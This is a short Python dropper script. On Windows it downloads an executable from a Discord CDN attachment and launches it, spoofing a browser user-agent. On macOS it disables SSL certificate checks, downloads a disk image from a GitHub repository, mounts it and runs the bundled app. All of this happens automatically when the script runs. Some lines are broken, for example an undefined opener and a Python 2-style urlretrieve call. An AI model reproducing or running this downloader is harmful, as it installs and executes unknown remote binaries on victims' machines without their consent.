import os
#import urllib.request
import urllib
#from urllib.request import Request, urlopen
import platform, time
import subprocess
import ssl
import zipfile

def os_check():
    if platform.system() == 'Windows':
        windows_dropper()

    if platform.system() == 'Darwin':
        mac_dropper()

    else:
        exit()

def windows_dropper():
    user = os.getlogin()
    link = 'https://cdn.discordapp.com/attachments/1039295632671780968/1040036623208939651/stem_scanner_mac.exe'
    path = 'C:/Users/' + str(user) + '/Documents/App.exe'
    #opener = urllib.request.build_opener()
    opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1941.0 Safari/537.36')]
    urllib.request.install_opener(opener)
    urllib.request.urlretrieve(link, path)
    time.sleep(3)
    os.startfile(path)

def mac_dropper():
    user = os.getlogin()
    link = 'https://github.com/xcxctestnet/yep1/raw/main/HD.dmg'
    path = '/Users/' + user + '/Downloads/HD.dmg'
    ssl._create_default_https_context = ssl._create_unverified_context
    urllib.urlretrieve(link, path)
    time.sleep(1)
    #unzipped = '/Users/' + user + '/Downloads/stem_scanner_mac.app'
    #with zipfile.ZipFile(path) as z:
    #    z.extractall()
    #time.sleep(3)
    os.system('chmod 744 ' + path)
    time.sleep(1)
    os.system('hdiutil attach ' + path)
    os.system('/Volumes/stem_scanner_mac/stem_scanner_mac.app/Contents/MacOS/stem_scanner_mac')
    
os_check()
